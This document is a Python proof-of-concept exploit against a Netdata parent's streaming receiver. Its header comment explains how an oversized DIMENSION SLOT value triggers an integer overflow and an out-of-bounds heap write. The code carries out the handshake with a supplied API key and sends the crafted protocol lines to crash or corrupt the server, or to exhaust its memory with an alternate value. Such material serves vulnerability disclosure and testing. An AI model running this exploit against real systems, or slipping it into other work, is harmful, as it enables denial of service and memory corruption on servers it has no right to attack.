#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-3.0-or-later
#
# Network-level PoC for the DIMENSION SLOT integer-overflow heap overflow in a
# Netdata parent (streaming receiver).
#
# THREAT MODEL: a malicious or compromised "child" that possesses a valid,
# enabled streaming API key (UUID) and connects from an allowed IP (default
# `allow from = *`). This is the documented parent<-child trust boundary;
# the parent parses the streamed pluginsd protocol from the child.
#
# This script performs the streaming handshake and then sends:
#     CHART  evil.chart  ...           (establish a chart scope)
#     DIMENSION SLOT:0x0AAAAAAAAAAAAAAB d1 ...   (trigger the overflow)
#
# The SLOT value is parsed by pluginsd_parse_rrd_slot() via str2ull_encoded()
# as a full 64-bit integer (only negatives are clamped). It then becomes both:
#   - the multiplier in prd_array_create():
#       callocz(1, sizeof(PRD_ARRAY) + slot * sizeof(struct pluginsd_rrddim))
#     where sizeof(struct pluginsd_rrddim)==24 -> slot*24 overflows size_t,
#     producing a tiny (24-byte) allocation, and
#   - arr->size (the loop bound) used by the init loop in
#     pluginsd_rrddim_put_to_slot(), which writes 24 bytes per index up to
#     slot -> massive out-of-bounds heap write -> crash / heap corruption.
#
# Use 0x40000000 instead to demonstrate the ~25GB allocation -> fatal()/OOM DoS.
#
# USAGE: python3 poc_stream_dimension_slot.py <parent_host> <parent_port> <api_key_uuid> [slot_hex]
#
import socket, sys, time, uuid

def main():
    if len(sys.argv) < 4:
        print("usage: %s <host> <port> <api_key_uuid> [slot_hex]" % sys.argv[0])
        return 1
    host = sys.argv[1]
    port = int(sys.argv[2])
    api_key = sys.argv[3]
    slot = sys.argv[4] if len(sys.argv) > 4 else "0x0AAAAAAAAAAAAAAB"

    machine_guid = str(uuid.uuid4()).replace("-", "")  # 32-hex "machine" guid
    hostname = "evilchild"

    # The streaming GET request (see stream-connector.c / stream-receiver-connection.c).
    # capabilities/ver kept minimal; the parent negotiates down.
    req = ("STREAM "
           "key=%s"
           "&hostname=%s"
           "&registry_hostname=%s"
           "&machine_guid=%s"
           "&update_every=1"
           "&os=linux"
           "&timezone=UTC"
           "&hops=1"
           "&ver=1"
           " HTTP/1.1\r\n"
           "User-Agent: evilchild/0.0\r\n"
           "Accept: */*\r\n"
           "\r\n") % (api_key, hostname, hostname, machine_guid)

    s = socket.create_connection((host, port), timeout=10)
    s.sendall(req.encode())
    time.sleep(0.5)
    resp = s.recv(4096)
    print("[*] parent handshake response: %r" % resp[:120])
    if b"Hit me baby" not in resp:
        print("[!] not accepted (check api key / allow from). aborting.")
        return 2

    # Establish a chart scope. CHART format: CHART type.id name title units family context ...
    chart = "CHART evil.chart '' 'evil' 'units' 'fam' 'evil.ctx' '' 1000 1 '' 'poc' 'poc'\n"
    s.sendall(chart.encode())

    # The malicious DIMENSION with an out-of-range SLOT.
    # Format: DIMENSION SLOT:<value> id name algorithm multiplier divisor options
    dim = "DIMENSION SLOT:%s d1 'd1' absolute 1 1 ''\n" % slot
    print("[*] sending: %s" % dim.strip())
    s.sendall(dim.encode())

    time.sleep(1.0)
    try:
        more = s.recv(4096)
        print("[*] post-payload recv: %r" % more[:120])
    except Exception as e:
        print("[*] connection error after payload (expected on crash): %s" % e)
    s.close()
    print("[+] sent. Observe parent: SIGSEGV/heap corruption (slot 0x0AAA...) "
          "or fatal()/OOM (slot 0x40000000).")
    return 0

if __name__ == "__main__":
    sys.exit(main())
